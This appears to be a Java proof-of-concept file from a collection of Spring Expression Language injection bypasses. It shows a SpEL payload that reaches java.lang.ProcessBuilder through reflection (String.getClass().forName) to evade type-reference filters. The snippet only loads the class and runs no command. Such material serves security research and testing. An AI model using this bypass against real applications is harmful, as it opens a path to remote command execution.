package PoCAndBypass.NormalBypass;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class ReflectProcessBuilderBypass {
    public static void main(String[] args) {
        String spel = "T(String).getClass().forName(\"java.lang.ProcessBuilder\")";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
